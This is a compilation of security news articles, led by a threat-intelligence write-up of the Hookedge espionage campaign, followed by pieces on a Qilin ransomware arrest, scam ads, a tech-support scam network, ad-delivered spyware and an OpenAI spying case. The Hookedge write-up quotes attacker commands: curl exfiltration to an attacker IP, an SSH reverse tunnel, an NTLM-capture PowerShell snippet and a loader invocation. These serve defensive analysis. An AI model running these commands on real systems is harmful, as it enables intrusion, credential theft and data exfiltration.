Title: Swallowtail: Russian Espionage Group Targets Defense Firms in Two NATO Countries
Context: Targeting The Hookedge backdoor used in these attacks was first documented by Recorded Future's Insikt Group, which tracks the group as BlueDelta, in August 2026
Full Text:
Tooling and tradecraft

Hookedge is delivered through macro-enabled Word documents and communicates entirely through the webhook.site service, using it to stage tasks and to receive their output. Infected hosts fetch tasks using a hidden, off-screen instance of the Microsoft Edge browser rather than a conventional downloader.

At the target where the Threat Hunter Team discovered the most extensive follow-up activity, a second-stage Hookedge component abandoned webhook.site in favor of a dedicated IP address operated by the attackers, used for both tasking and exfiltration.

The attackers used two distinct credential-theft techniques. In one, they pushed an SSH private key onto the compromised host and immediately used it to open an SSH connection back to their own server, requesting a persistent, backgrounded tunnel that would give them a route from their infrastructure into the target's internal network.

In the other, they ran a short, self-contained PowerShell script that stands up a listener on the host's own loopback address and forces the machine to authenticate to it, capturing the resulting NTLM handshake. Both techniques are detailed in the attack chain below.

An undocumented reflective loader

The attackers also deployed a previously undocumented tool (file name: ld.exe). It is a reflective loader, run with an encrypted file and a decryption key supplied as command-line arguments. It decrypts the file in memory and calls an exported function named ExecuteLoader. Threat Hunter recovered the specific key and encrypted-payload filename used in one execution of this tool, but the payload itself was not recovered, so its ultimate function is unknown.

Attack chain: Intrusion against a naval shipbuilder

In the attack against the naval shipbuilder, the initial infection vector was a malicious Word document, which served as the dropper for the Hookedge backdoor. On the afternoon of July 24, 2026, the document was opened directly from the Outlook attachment cache, confirming it arrived as a received email attachment.

The document contained a heavily obfuscated macro that split its VBA source and written strings into short fragments joined at runtime, a technique used to defeat static antivirus scanning. Once executed, the AutoOpen routine dropped four files into the user's profile to initiate the Hookedge infection chain: a VBScript launcher, an HTML/XHTML pair designed to auto-submit a hidden form to a webhook endpoint as soon as it loaded, and a batch script.

The batch script first killed any running instance of the Microsoft Edge browser and deleted stale download artefacts, then launched a new, effectively invisible Edge window sized to a single pixel and positioned off-screen, passing it an inline, base64-encoded JavaScript payload rather than a URL:

taskkill /f /im msedge.exedel /q /f "%userprofile%\Downloads\*.000"del /q /f "%userprofile%\Downloads\*.tmp"del /q /f "%userprofile%\Downloads\*.crdownload"start "" msedge.exe --window-size=1,1 --window-position=10000,10000 --ignore-certificate-errors "data:text/html;base64,<encoded JavaScript>"

Decoded, the JavaScript simply fetched a resource from a webhook.site endpoint and forced the hidden browser to save the response to disk under the same identifier, using the browser itself as an HTTP client rather than a conventional downloader:

fetch('https://webhook.site/890efd8d-6e9e-428a-bcf9-987745d71000') .then(r => r.blob()) .then(blob => { /* save as 890efd8d-....000 via an auto-clicked <a download> link */ })

After a short pause the batch script located the downloaded file, copied its contents into a new .cmd file, executed it, and uploaded the output back to the same webhook endpoint before deleting the temporary files. This is the delivery-and-callback loop that both requests instructions from a webhook.site endpoint and separately reports the results of running them.

The downloaded task, run a couple of minutes after the document was opened, was a single large reconnaissance batch. It began with a canary request to the same webhook.site endpoint, then probed outbound connectivity to a set of well-known cloud services and a hard-coded IP address:

curl http://webhook.site/890efd8d-6e9e-428a-bcf9-987745d71000curl -k https://dl.dropboxusercontent.com | find /i "<title>"curl -k https://accounts.google.com | find /i "<title>"curl -k https://login.microsoftonline.comcurl -k https://mega.nz/file | find /i "<title>"curl -k https://example.comcurl http://example.comcurl http://23.220.75.245

It then queried the host's proxy and WPAD configuration, before running a standard discovery sweep: the current logged-on sessions, full IP configuration, system information, running processes, and directory listings of the user's profile, Downloads, Desktop, Documents and both Program Files folders. Probing reachability to Dropbox, Google, Microsoft's login portal and Mega alongside a bare IP address suggests the attackers were checking which outbound channels were available to them on this network. This was possibly a precursor to choosing where to stage further payloads or exfiltrate data, before deciding whether the host was worth escalating against.

There was then a gap of about three days. On the morning of July 27, a new copy of the same generic Hookedge VBS launcher appeared under a fresh, randomly generated filename but with the same file hash as before. This was followed shortly afterwards by a second, more capable batch script. Unlike the first stage, this script fetched its next task directly from a hard-coded IP address rather than from webhook.site:

set outfile=<random>.cmdcurl -k -o %outfile% https://185.82.218.119:443/53379b62-8020-41cf-af57-effa6e1e8506start 53379b62-8020-41cf-af57-effa6e1e8506.vbs %outfile%

From this point on, every task fetched from that IP address arrived wrapped in the same short template: a POST to the operators' server acknowledging receipt, the operator's actual command running with its output captured to a file, that file uploaded back to the same server, and the temporary files deleted:

chcp 65001curl -k -X POST https://185.82.218.119:443/53379b62-8020-41cf-af57-effa6e1e8506 -d "del %0" (<command> echo 53379b62-8020-41cf-af57-effa6e1e8506) >> <random-output-file> 2>&1curl -k --data-binary @<random-output-file> -H "Content-Type: text/plain; charset=utf-8" https://185.82.218.119:443/5b73dc69-d765-4440-a4d2-e9eb33283eb9 del /q /f 5b73dc69-d765-4440-a4d2-e9eb33283eb9*

The identifier 53379b62 names the second-stage installer and its scheduled task, while 5b73dc69 identifies the command-and-control session used to fetch each individual task and upload its result. Over the following 30 seconds, seven tasks were issued in quick succession, each one arriving, executing and reporting back within two-to-eight seconds of the last, a cadence consistent with an operator working interactively rather than a fixed polling timer. The first was a simple identity check:

whoami

The next set of commands moved straight into credential-material staging. The operators had a file pushed down through the same fetch-and-rename pattern used for tasking. This file was renamed to id_rsa once downloaded, and then adjusted its permissions on a named local account before listing the directory to confirm the change had taken effect:

curl -k -o <file> https://185.82.218.119:443/5b73dc69-... ren <file> id_rsa dir C:\ProgramDataicacls C:\ProgramData\Adobe\id_rsa /setowner "<domain>\<user>" echo Y|cacls C:\ProgramData\Adobe\id_rsa /G "<domain>\<user>:F"

With that private key in place, the operators immediately used it to open an outbound SSH connection to their own server, disabling host-key checking and forcing legacy RSA algorithms so the connection would succeed regardless of the target's default SSH client configuration:

C:\Windows\System32\OpenSSH\ssh.exe -i C:\ProgramData\Adobe\id_rsa -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa -p 80 root@185.82.218.119 -R 185.82.218.119:48097 -Nf

The -R flag requests a remote port forward back through the tunnel to the operators' own server, the bare port number (rather than a host:port pair) requests a dynamic, SOCKS-style forward; -N means the session carries no interactive shell, only the forward; and -f backgrounds the process once authentication succeeds. Together this establishes a persistent, backgrounded tunnel that gives the operators a route from their own infrastructure back into the target's internal network through the compromised host, rather than a one-off remote-access session. A DNS lookup of another internal hostname followed immediately afterwards, suggesting the tunnel was being used, or tested, for reconnaissance of the internal network almost as soon as it came up.

A few hours later, the operators ran a ping and a DNS lookup against one further internal hostname, then a ping against a second, continuing to map out names on the target's internal network.

Following this, the operators deployed a credential-theft technique distinct from the SSH tunnel: a PowerShell script that stands up a fake web server on the loopback address and forces the host to authenticate to itself over SMB, in order to capture the resulting NTLM handshake.

$listener = New-Object System.Net.HttpListener $listener.Prefixes.Add('http://localhost:8080/')$listener.Start()Start-Job -ScriptBlock { net use f: \\localhost@8080\c$ }while ($true) { # respond 401 + WWW-Authenticate: NTLM, capture up to 4 Authorization headers }

The script pre-built a fixed NTLM Type-2 challenge, then relied on the `net use` command in the background job to make the local machine authenticate to its own listener over what looks like an SMB-over-HTTP share. Each such NTLM handshake yields an NTLMv2 challenge/response pair; from that pair an attacker can attempt offline cracking of the current user's or machine account's password hash, or relay it to authenticate to another host on the network as that account. The script was configured to capture up to four authentication attempts before stopping. This is a self-capture technique in the same family as tools like Responder or ntlmrelayx, implemented here as a short, self-contained PowerShell script rather than a purpose-built credential-theft binary.

Immediately afterwards, the operators looked up a third internal hostname, then ran a short privilege and group-membership check:

whoami /allnet groupsnet group Administrators ipconfig /all

The next day, July 28, the operators resumed activity with DNS lookups of two more internal hostnames, one of which appeared from its name to be a mail server, followed by a combined inventory command covering the host's general configuration, running processes and installed patches:

systeminfo && tasklist && wmic qfe get HotFixID InstalledOn Description

A few hours later, the operators killed the ssh.exe process:

taskkill /f /t /im ssh.exe

This ended the tunnel established the day before; whether it was closed as routine operational hygiene, to rotate to a fresh session, or because the tunnel was no longer needed at that point is not clear from the available data.

Beaconing to the same command-and-control session continued through July 29 and into the morning of July 31, in short bursts every few hours, without any further distinct commands appearing in the available data until the morning of July 31. At that point the operators pushed down two more files through the same fetch-and-rename pattern used for the SSH key: one renamed to ld.exe, the other to Events.dat.

curl -k -o <file> https://185.82.218.119:443/...ren <file> ld.exe curl -k -o <file> https://185.82.218.119:443/...ren <file> Events.dat

ld.exe (SHA256: f1cc91e7427a22027f65d31bbee19c54b602d08d7d93e4745b9cea59fa8132ff) had in fact already been staged on the host from the previous afternoon. It was then run directly, with both its decryption key and the path to the encrypted file supplied as command-line arguments:

C:\ProgramData\ld.exe DE063CF3F2E2A83E7B1A277C052A340E C:\ProgramData\Events.dat

Analysis of ld.exe found it to be a reflective loader: it takes an encrypted file and a key as arguments, decrypts the file in memory, and calls an exported function named ExecuteLoader. The decrypted content begins with the four-byte marker ADSA (0x41534441). Events.dat, the specific encrypted file supplied in this run, was not recovered, so what it ultimately decrypts to and executes is unknown. The command line does, however, resolve two things that were previously open questions: the name of the encrypted payload file and the decryption key used to unlock it on this host.

The burst closed with one further identity check:

net user

This is the last distinct operator command present in the available data. The infrastructure itself, however, remained active well beyond this point: the same ld.exe hash and the same generic VBS launcher were both still present on the host roughly four weeks later, in late August, and the launcher was observed once more on September 24, the most recent activity. Whether this reflects the original scheduled task continuing to fire and simply finding no new tasking most of the time, or renewed operator interest at those later dates, cannot be determined from the data available.

Broad campaign targeting governments and defense

The targeting in this campaign spans two NATO member states and three distinct sectors of national security relevance: law enforcement, defense manufacturing and shipbuilding. That breadth, combined with the timing identified in Recorded Future's report, is consistent with a collection effort tasked broadly against European government and defense targets rather than a single focused operation.

The tradecraft observed after initial access, credential theft through two independent techniques, a persistent network tunnel, and a previously undocumented loader, goes beyond the delivery mechanism that has so far been publicly reported on this campaign.

Organizations that identify Hookedge indicators in their environment should treat the intrusion as potentially ongoing rather than concluded and should look for the credential-theft and tunneling activity described here rather than assuming the backdoor's installation was the extent of the attackers' activity.

Title: Police arrest Qilin ransomware suspect on holiday, as links made to Synnovis hack that contributed to patient’s death
Context: A subsequent probe into the attack by King's College Hospital NHS Foundation Trust confirmed that a patient died in part due to blood test results being delayed
Full Text:
A 28-year-old Russian man has been arrested by German police, suspected of being a key member of the Qilin ransomware gang. As BBC News reports, detectives have linked the man to the 2024 attack against blood-testing firm Synnovis, that disrupted London hospitals, and resulted in the death of a patient.

The suspect, who has been named by German media only as "Vladimir K" was originally detained in May in Japan, after he travelled there on holiday. According to German officials, the man's vacation plans were intercepted and Japanese police were waiting for him on arrival. Earlier this month he was extradited to Germany.

Germany's interest in "Vladimir K" is related to a cyber attack in September 2024, which saw around US $160,000 worth of cryptocurrency extorted from a logistics firm. According to the BBC, German detectives have now included in their investigation possible links to the June 2024 attack which saw the Qilin ransomware group disrupting pathology services at various London hospitals, and resulted in the cancellation of operations and outpatient appointments.

The incident is said to have crippled Synnovis’s IT systems, and caused a critical shortage of O-type blood in hospitals. A subsequent probe into the attack by King's College Hospital NHS Foundation Trust confirmed that a patient died in part due to blood test results being delayed.

As a consequence, British police are reportedly examining whether their own inquiry could lead to a charge of unlawful killing.

No ransom was paid by Synnovis, a decision the firm made jointly with the NHS trusts to which it provides services.

Ransomware gangs have been accused of causing deaths in the past. For instance, in 2020 a different gang disrupted systems at a Düsseldorf hospital and caused a seriously-ill woman to be diverted to another health facility 30 km away.

According to reports, as a result of the attack doctors were not able to start treating the patient for an hour and she died.

The Qilin ransomware-as-a-service (RaaS) group has been operating since at least 2022, and has reportedly hacked more than 4000 organisations, and extorted over US $140 million. High profile victims include Japanese beer-maker Asahi, potentially exposing the data of more than 1.5 million customers and around 275,000 current and former employees and their families.

Title: Is the ad a scam? How to tell before you click
Context: Also known as malvertising, a click on this kind of ad will exploit browser/software vulnerabilities or trick you into unwittingly installing malware via an app download
Full Text:
Fraudulent ads have been around for about as long as the advertising industry. Today, they often reach you through social media feeds, apps and search results you use every day, and the platforms showing them can also (inadvertently) help build them. In September, the US Federal Trade Commission (FTC) asked whether platforms should be required to stop impersonation scam ads from ever reaching consumers. Its concern is the ad tools that those platforms offer to advertisers. They can generate the copy, images and video, and optimize who sees the result, regardless of whether the ads are legitimate or not.

In Europe, nearly one trillion scam ads were served to social media users in 2025, generating an estimated £3.8 billion in revenue for these platforms. In the US, data is harder to come by, although Meta alone projected 10% of its 2024 revenue would come from ads for scams and banned goods, amounting to a staggering $16 billion.

For consumers, the message is clear: you might trust the platform, but you can’t trust the ads on it.

What do scam ads look like?

Scam ads could appear on search engine pages, e-commerce marketplaces and shopping sites, mobile apps and games, video sites, messaging platforms and a host of other websites. But perhaps the biggest risk comes from social media sites. Nearly a third (30%) of people who reported losing money to a scam last year said it started on social media.

They could include advertising that:

Impersonates a legitimate company and leads to a phishing site designed to mimic the real version

Offers special deals on goods for a limited time, as a way to create a sense of urgency

Offers investment opportunities, often in cryptocurrency ventures, that promise high returns with no downside

Impersonates customer support for legitimate companies like banks

Promises mega giveaways of cash and prizes which only require the user to share personal and financial information to access

Scares the victim with fake security warnings that their computer or device is infected

Engages the victim with clickbait such as outrageous news stories with sensational headlines

What’s the end goal?

These ads serve various purposes. Some may be outright malicious. Also known as malvertising, a click on this kind of ad will exploit browser/software vulnerabilities or trick you into unwittingly installing malware via an app download. Others are designed to persuade you into handing over personal information via prize giveaways, questionnaires and other phishing-style pages. This could subsequently be used to commit identity fraud.

Another category of scam ads will target your finances more directly. They may ask for money to invest in a fictitious scheme, pay for a non-existent product, or hand over money to pay a fake fee, for example. In some cases, the scam ad may take you to a fake e-commerce site which covertly harvests your card details.

While these efforts are often digital, beware too of calling phone numbers on ads. They might put you through to a scam call center where the operatives will be trained to relieve you of your money and/or personal/financial information. This is often what happens if you get swindled by a fake security alert.

Banks hate these scams because, in jurisdictions like the UK, they are responsible for reimbursing customers for “authorized push payment” (APP) losses in some instances. They have long argued that social media platforms in particular should do more to police this content, and to compensate victims. However, in the US and elsewhere, social media companies aren’t legally bound to do so, despite profiting from the ad revenue.

This may change, of course, depending on the outcome of the FTC’s rulemaking, which is at its earliest stage. It says it may consider forcing platforms to vet advertisers, monitor posted ads, investigate scams, remove fraudulent advertising, and pursue disciplinary action, among other measures.

Scam-ad red flags: what to look out for

In the meantime, the best you can do is to spot the warning signs of a scam and steer well clear of suspect ads. You should be able to spot them by looking out for a few common red flags that include:

Urgent language encouraging you to act quickly. This rushes us into making decisions that otherwise we may not make, like sharing our personal information.

Too-good-to-be-true offers that trigger our fear of missing out. These are often presented as time-sensitive in order to ramp up the urgency.

Any requests for sensitive personal information, which could help fraudsters build a profile of us with which to use for identity fraud. It could be details as innocuous as email/home address, phone number and full name.

Phone numbers on ads that will probably route you to a scam call center. Most legitimate companies funnel support issues through digital channels initially.

Pressure to download software in order to fix an ‘issue’ with your computer/device.

Sensational news designed to tantalize and persuade you to click through.

Celebrity endorsements for products and services for sale (sometimes deepfaked), or investment opportunities.

What happens if I’ve fallen victim to a scam ad?

If you’ve clicked through on a scam ad or called the number, and then downloaded something, handed over some personal/financial information, used your card to buy something, or made a bank transfer, don’t panic. Also:

Don’t reply to any further messages from the scammer and monitor your accounts for suspicious activity.

If relevant, contact your bank or card provider immediately and tell them what happened. They should be able to freeze your card or account while they investigate. If you’ve made a transfer, it will fall under an APP fraud claim. Card payments may be eligible for a chargeback.

If you’ve handed over passwords, change them immediately on the relevant site and anywhere else you’ve reused them. Switch on two-factor authentication (2FA) for these sites and consider using a password manager to store strong, unique credentials for every account.

If you’ve downloaded anything, run a scan using security software from a reputable provider. And ensure your operating system and all applications are all up to date.

Preserve evidence of the scam where possible. This includes the ad itself, and any URLs, screenshots, emails/messages, payment records or correspondence with the scammer. It will help if you’re able to proceed with a reimbursement claim.

Report the ad to the platform that showed it, using its built-in reporting option, and report the scam to the authorities, e.g. the FTC (US) or Report Fraud (UK).

Scam ads are getting easier to generate thanks to AI, and can look increasingly professional, even including video content. That puts more pressure on you to spot the warning signs. Stay safe.

Frequently asked questions (FAQs)

Why are there so many scam ads on Facebook and Instagram?

Scammers place them there to get maximum exposure, knowing the platforms don’t police their content rigorously. They may want your personal/financial information, or to trick you into buying a non-existent product. They may even want to con you into a fake investment.

How can I tell if an ad is a scam?

It might use urgent language and too-good-to-be-true offers, potentially endorsed by celebrities. It may ask for sensitive personal information, or feature phone numbers that take you to a call center where operatives will ask for the same details or urge you to download remote access software. It might claim your PC is infected with malware and pressure you into taking action. It could even deliver sensational news designed to encourage click throughs.

Can I get my money back if I paid through a scam ad?

Social media companies are not required by law to compensate users that may have been defrauded. But depending on where you live you may be able to file an APP claim with your bank. If you’ve made a card payment, you may be able to file a chargeback claim.

What should I do if I’ve fallen victim to a scam ad?

Don’t panic. Preserve the evidence and stop any communication with the scammer. Monitor your accounts for suspicious activity. Change any passwords you’ve shared and switch on 2FA. Contact your bank or card provider, tell them what happened, and ask them to freeze your bank account/card. If you’ve downloaded anything, run a security scan and ensure your operating system and software are all up to date. Report the ad to the platform and the scam to the authorities.

Title: Researchers Infiltrate Microsoft Tech Support Scam Operation
Context: The tools are used by cybercriminals in malvertising campaigns, ransomware attacks, and other threats to re-route unsuspecting Web users to malicious destinations while also...
Full Text:
Tech support scams seem like a dime a dozen these days. Still, researchers got an inside look at one long-running operation to see how cybercriminals are using legitimate tools and infrastructure to masquerade as Microsoft IT personnel.

In a recent report, Infoblox detailed Help TDS (traffic distribution system), a malicious tool used by cybercriminals since 2017 to redirect Web traffic to their desired destinations. TDSes were originally designed as traffic management tools for digital advertising partners, known as affiliates, to filter Web traffic and redirect specific users to ads based on criteria such as region, operating system, device, and more.

But over the past decade-plus, a wide variety of threat actors have abused commercial TDS platforms, and even developed their own underground versions marketed on the Dark Web. The tools are used by cybercriminals in malvertising campaigns, ransomware attacks, and other threats to re-route unsuspecting Web users to malicious destinations while also filtering out systems with antimalware protection and sandboxes, for example.

Related:Shadowy AI Relay Disables OpenAI Codex, Claude Code Sandboxes

In the case of Help TDS, victims are redirected to a tech support scam operation that, like many others, deploys fake security alerts to scare users into calling a support number. But threat actors operate the call center, not Microsoft employees, and their goal is to convince victims to install remote desktop tools on their systems.

"It's not simple credit card fraud: it's remote access, living-off-the-land malware operations," Infoblox researchers wrote. "Once in, the threat actor can exploit the victim time and again."

While investigating Help TDS, Infoblox researchers obtained direct access to the platform's affiliate panel, which not only provided clues to its origin but also illustrated how these Microsoft-focused tech support scams operate.

Inside the Help TDS Tech Support Scam

According to Infoblox, Help TDS acts as the routing decision infrastructure for more than a dozen affiliates — except the affiliates are scam operations and cybercriminal groups rather than legitimate advertising partners. In the case of Help TDS, some of these affiliates are well-known threats, such as the Balada Injector and DollyWay malware operations.

Infoblox researchers investigated Help TDS over the past year and determined the platform is operated by Hotejka, a Russian-language advertising affiliate network. Infoblox declined to say how it achieved access to the affiliate panel, to prevent Help TDS from removing that access, but provided Dark Reading with additional screenshots and evidence not contained in the company's published report. The screenshots of the Hotejka affiliate panel show many of the familiar features of panels from other advertising networks, such as smartlinks and referral offers, campaign demonstrations, and tracking dashboards.

Related:F-Secure Launches Victim-First Scam Encyclopedia Covering 50+ Types of Consumer Fraud

Hotejka's affiliate panel includes direct links to tech support scam campaigns. Source: Infoblox

But the researchers also found that the panel contained direct links to the Microsoft-themed tech support scam and a malicious WordPress plug-in previously documented by GoDaddy researchers. In short, any "affiliate" of Hotejka could select the tech support scam as a campaign to run, or select "mainstream" smartlinks as a typical advertising partner might choose.

When a threat actor, such as a DollyWay operator, selects the tech support scam as the destination for its hijacked WordPress traffic, for example, unsuspecting users are filtered through the Help TDS. Each prospective victim is fingerprinted and rerouted to either the tech support scam or another affiliate platform for further monetization.

When the tech support scam is initiated, a user's PC is hit with a Windows notification for a required update, which will restart their system. Regardless of whether the user chooses to restart immediately or later, the screen flashes and displays another Windows error message, followed by a fake warning from Microsoft Windows Security Center stating that the user's access to the device has been blocked, with voice-over instructions urging users not to restart their systems and to call a listed telephone number to reach Microsoft technical support staff.

Related:AI Slop Isn't Just for Social Media; It's Ruining Cyberattacks, Too

Call Center Shenanigans

Infoblox's investigation went a step further than just identifying the technical aspects of the Help TDS operation. Renée Burton, vice president of threat intel at Infoblox, called one of the phone numbers listed in the scam Windows security alert and was routed to an individual who claimed to be a Microsoft technical support employee, working in what sounded like a busy call center.

Infoblox recorded and published the conversation, during which the threat actor repeatedly assured Burton that she would not be charged for the support. After asking her several questions, the phony support employee directed her to use ctrl-alt-delete to log out of the Windows system and then log back in. He then advised her to open the Start window and go to ultraviewer[.]net, the home page for a free remote desktop application for PCs.

Burton was put on hold several times during the 13-minute call, which researchers believe was done for the threat actors to perform additional screening and profiling. The call ended abruptly after she questioned the need to download the remote access tool; Burton said it's not clear if there was an accidental disconnection or if the phony support employee got suspicious and ended the call.

"They are pretty good about controlling the call centers," she says, adding that Infoblox hasn't yet re-established contact with the scam operation. "You have to call during certain hours, and they check the IPs and devices."

Burton says the Help TDS operation has three things that distinguish it from other tech support scams. First, the browser lock component is very effective and completely disables keyboard access, while the voice-over instructions provide "a huge social engineering component to it."

Second, the Help TDS Telegram channel is used for command-and-control (C2) rollovers, rapidly changing C2 domain sets every five minutes over the past six months, according to the report. "I think it's very effective in keeping their systems up," Burton says, as it makes tracking and blocking malicious activity much harder.

And lastly, Burton says the Help TDS affiliate model is unique and gives the tech support scam substantial scale. "These guys have the affiliates that are all the big names in the website malware industry," she says.

Help TDS Runs on Cloudflare and Keitaro

A key component of the Help TDS scam operation is its abuse of "free, disposable" Cloudflare Pages sites for infrastructure since April, according to Infoblox. And the volume has been significant.

"The threat actor creates hundreds of new pages a day. We detected over 20,000 such domains in a six-month period," the report stated. "Another 10,000 pages were created in what appear to be additional phishing or decoy operations."

Infoblox researchers noted that Hotejka uses several different domain generation algorithms to create approximately 300 new Cloudflare Pages sites a day. Infoblox noted that when Help TDS migrated to Cloudflare Pages earlier this year, the company saw up to 4% of its cloud customers exposed to Help TDS on a single day. "While these numbers might not seem large, it shows that Help TDS, often through affiliates who compromise websites, but also through malvertising, social media, and spam distribution, can reach a wide range of organizations," the report stated.

And while Infoblox researchers reverse-engineered the algorithms and can now detect Hotejka's new Cloudflare Pages sites about seven days before they're used by Help TDS, there are still significant challenges for tracking and documenting the abuse. "The C2 rolls over so fast, and there's a new C2 every five minutes. And It seems to be [using] a lot of Cloudflare accounts," Burton says, adding that the "crazy variety" of abused Cloudflare accounts isn't typical of similar campaigns, which typically one use one or two.

Another challenging aspect is that Help TDS is still running on the same Keitaro server that it was initially deployed on nearly a decade ago, according to Infoblox. Keitaro is a commercial TDS firm whose platform has been frequently abused by threat actors, leading to questions about its security and misuse prevention efforts.

While Keitaro and parent company Apliteni earlier this year cooperated with researchers at Infoblox to disrupt abuse of their platform, it's unclear if the Keitaro server is a supported version of the TDS software or a cracked or older version with no license control. Burton says she suspects it's the latter, but because the server is behind Cloudflare services, the researchers are unable to confirm it and determine the full nature of the infrastructure.

Burton says Infoblox reported some of the recent domains to Cloudflare and provided technical samples of the operation, and that the company is reviewing them.

'AdFection' Turns Ad Impressions Into Zero-Click Spyware Delivery

Spyware vendors are exploiting targeted ad bidding in the digital ecosystem to identify and track individuals and organizations of interest.

Jai Vijayan,Contributing Writer

October 19, 2026

5 Min Read

Source: Lightspring via Shutterstock

An Israeli company that presents itself as a legitimate digital advertising business is helping spyware vendors use targeted online ads to deliver surveillance malware to individuals and entities worldwide, researchers are warning.

The technique, dubbed "AdFection" by researchers at the University of Toronto's Citizen Lab, can enable infections without victims clicking links or taking any other action, essentially turning routine ad impressions into potential launchpads for covert cyberattacks.

In a recent report, the researchers detailed how an ad-tech company called Discover-Tech allegedly used the AdFection technique to help spyware vendor Candiru infect at least 45 devices belonging to personnel at international news organization Al-Jazeera. Candiru, which now calls itself Integrity Labs, is a company that the US Department of Commerce previously placed on its Entity List of individuals and organizations subject to export restrictions for providing foreign governments with spyware to target individuals.

Related:Biomemory Launches DNA Shield, First Commercial Product Built on Its Molecular IT Platform

The AdFection Cyberattack Chain

Citizen Lab has a long record of investigating the abuse of commercial spyware by government agencies around the world. In 2016, for instance, it reported on how the NSO Group had been quietly exploiting three zero-day vulnerabilities in Apple's iOS software to deliver its Pegasus spyware on devices belonging to select journalists and activists. More recently, Citizen Lab reported zero-click attacks that delivered Pegasus spyware to human rights workers in Mexico and a commercial spyware tool dubbed Paragon to spy on prominent journalists.

According to Citizen Lab, Discover-Tech's AdFection technique moves on from prior attack types in that it relies on a real-time bidding process that determines which ads users see on websites and in mobile apps. These auctions take place in milliseconds as a page or app loads, and can expose information about users and their devices, including IP addresses, mobile advertising IDs, and cookies. Advertisers typically use these identifiers to target individuals with tailored ads that often can also execute code of their own within a browser or app. The capabilities create a pathway for surveillance operators to identify devices of interest, gather information about their users, and deliver spyware when a targeted ad is displayed, Citizen Lab said.

The AdFection attack chain begins with Display-Tech winning one of these bids, then pushing an ad out to a website or an app that might be open on a user's device. When the ad renders, a tag embedded inside it, contacts a Discover-Tech-controlled server, and supplies identifying information about the device. The server checks whether the device matches specific targeting criteria and returns JavaScript if it does, or an empty response if it doesn't. Citizen Lab was unable to recover the JavaScript itself, but network logs that Al Jazeera supplied showed infected devices contacting Discover-Tech infrastructure, then Candiru validator servers, and ultimately a Candiru command-and-control server.

Related:Foul Language: WordlistLoader Disguises Malware as Ordinary Text

Discover-Tech’s Controlium platform lets customers configure campaigns to target specific devices using IP addresses, cookies, and mobile advertising IDs, Citizen Lab said. Citizen Lab's analysis showed that over a four-month period alone, Discover-Tech served targeted ads to almost 200,000 unique websites and Android/iOS applications across dozens of countries. Citizen Lab said it found Discover-Tech served ads on devices associated with a wide range of government, military, critical infrastructure, media, and multilateral agencies across multiple countries.

The ad impressions by themselves do not confirm targeting or infection, Citizen Lab stressed. But it does highlight "the systemic risk posed by AdFection and the advertising ecosystem and warrants urgent investigation to determine whether any users on these networks were infected with spyware."

Related:DROP Platform Lets Californians Reduce Digital Footprint

Ad Impressions Become Enabler of Mass Spying

Citizen Lab also linked Discover-Tech to other surveillance players, including mercenary hacking firm Bindecy and advertising-intelligence company Intelos, but said its strongest technical evidence of spyware infections delivered through targeted ads involved Candiru.

In addition, Citizen Lab plans to describe in a forthcoming report how another threat actor, which it tracks as Dark Cartographer, is using Discover-Tech's infrastructure to exploit weaknesses in mobile carrier systems to link device advertising IDs with phone numbers. The exploits involve WebRTC IP leaks, mobile-carrier HTTP header enrichment, and so-called zero-click login mechanisms. The researchers found indications of Dark Cartographer exploitation across mobile providers in more than 30 countries.

"Discover-Tech operates a platform called Controlium that enables its mercenary partners to de-anonymize, fingerprint, and automatically infect devices the moment an advertisement is rendered — a form of zero-click attack," Citizen Lab researchers wrote.

The company's "mass abuse, privacy invasion, and facilitation for mercenary spyware attacks illustrates structural flaws with the online advertising system, which failed to detect or prevent the abuse documented in this report," they noted.

Google, the Interactive Advertising Bureau (IAB) Europe and ad-tech platforms Beeswax, Vungle (Liftoff), and Eskimi have taken steps to cut off Discover-Tech’s access to the digital advertising ecosystem following Citizen Lab's disclosures, the report noted. Google, which collaborated with Citizen Lab, has terminated the company's access to its ad exchange platforms. IAB Europe has removed Discover-Tech from its vendor registries, Beeswax has removed it from its ad-buying platform, Eskimi has blocked the company's accounts and domains, and Vungle has paused Discover-Tech access while it conducts a review.

The Online Ad Industry's Role

Citizen Lab described its findings as the first technical evidence of malicious actors delivering mercenary spyware through targeted ads, without any user interaction. The researchers noted how Discover-Tech may have profiled millions of devices in its effort to help spyware operators identify potential surveillance targets.

The report also raised broader concerns about the advertising industry's role in enabling surveillance.

Citizen Lab noted how Discover-Tech had been embedded in the digital advertising ecosystem for years despite its known links to the spyware industry. The researchers called for stronger safeguards across the advertising industry and recommended that organizations consider blocking targeted ads at their network gateways to reduce exposure to AdFection attacks. Citizen Lab also recommended that government agencies mandatorily deploy ad-blocking software for all government-owned devices and disable unique advertising IDs on all government mobile devices.

Title: OpenAI Engineer Accused of Spying on Executives Ordered to Remain in Custody
Context: “There is a real threat here that once he leaves the case is over,” Tse said
Full Text:
The former OpenAI engineer accused of bugging a company conference room must stay in custody while he awaits trial, a federal judge ruled on Monday after expressing concerns about his ties to Saudi Arabia.

US prosecutors alleged Abdulrahman Alfozan is a flight risk because the Saudi Arabian government has offered to support him with no strings attached. They cited, for example, the Saudi consulate’s offer to work with a bail bonds firm to help fund Alfozan’s release.

Federal magistrate judge Alex Tse questioned whether Alfozan is an “asset” for the kingdom and how a bond backed by the government could keep him in the country. “I find that problematic,” Tse said. “It seems like a blank check. ‘We’re going to pay whatever the court wants to get him out.’ I’m more interested in people from his family wanting to put up assets.”

William Pernik, an attorney for Alfozan, dismissed the flight risk worries as baseless. But he failed to convince the judge that Alfozan was committed to his life in the US. “There is a real threat here that once he leaves the case is over,” Tse said.

Aflozan appeared in an orange prison uniform and a medical face mask pulled down over his neck on Monday in Tse’s San Francisco courtroom, which was filled to capacity with journalists, students on a field trip, and about 20 people supporting Alfozan.

Employee attempts to steal confidential company information are common in Silicon Valley. But Alfozan’s case has drawn international attention for the alleged amateur spycraft and geopolitical tensions at the center of it. Authorities haven’t offered a potential motive but have noted Alfozan has worked for a Saudi venture capital firm, offered consulting services to Saudi companies, and is supposedly friendly with people high up in the Saudi government.

Pernik said there is no evidence of Alfozan spying for Saudi Arabia or engaging in something covert. “It’s not as if he sneaked in under the covers of darkness,” he said of the OpenAI conference room. “This was an open room where anybody could work in.” The Saudi embassy didn’t respond to a request for comment.

After the hour-long hearing, Pernik told reporters he was disappointed with the custody ruling and would continue to try to fight it.

